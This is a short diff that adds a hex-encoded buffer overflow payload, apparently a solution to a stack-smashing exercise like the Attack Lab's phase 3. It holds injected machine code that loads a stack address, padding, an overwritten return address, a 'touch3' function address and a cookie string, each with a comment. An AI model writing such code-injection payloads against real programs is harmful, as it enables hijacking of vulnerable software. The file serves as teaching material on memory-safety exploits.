@@ -1,0 +1,6 @@
+48 c7 c7 a8 89 64 55 c3     /* rsp + 28 (the address where the cookie is present) */
+00 00 00 00 00 00 00 00     /* pad */
+00 00 00 00 00 00 00 00     /* pad */
+80 89 64 55 00 00 00 00     /* return address (%rsp) */
+40 27 40 00 00 00 00 00     /* touch 3 address */
+34 62 63 61 38 65 34 38     /* cookie converted to text */
